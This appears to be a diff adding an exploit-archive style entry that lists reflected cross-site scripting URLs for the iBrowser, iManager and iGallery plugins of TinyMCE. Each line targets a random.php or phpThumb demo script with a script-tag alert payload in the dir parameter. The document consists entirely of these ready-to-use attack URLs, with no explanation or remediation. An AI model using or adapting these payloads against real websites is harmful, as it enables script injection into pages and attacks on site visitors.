@@ -1,0 +1,13 @@
+iBrowser Plugin
+
+http://www.example.com/jscripts/tiny_mce/plugins/ibrowser/scripts/random.php?dir=&lt;script&gt;alert(&#039;zsl&#039;)&lt;/script&gt;
+http://www.example.com/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/demo/phpThumb.demo.random.php?dir=&lt;script&gt;alert(&#039;zsl&#039;)&lt;/script&gt;
+
+iManager Plugin
+
+http://www.example.com/jscripts/tiny_mce/plugins/imanager/scripts/random.php?dir=&lt;script&gt;alert(&#039;zsl&#039;)&lt;/script&gt;
+http://www.example.com/jscripts/tiny_mce/plugins/imanager/scripts/phpThumb/demo/phpThumb.demo.random.php?dir=&lt;script&gt;alert(&#039;zsl&#039;)&lt;/script&gt;
+
+iGallery Plugin 
+
+http://www.example.com/jscripts/tiny_mce/plugins/iGallery/scripts/pthumb/demo/phpThumb.demo.random.php?dir=&lt;script&gt;alert(&#039;zsl&#039;)&lt;/script&gt;
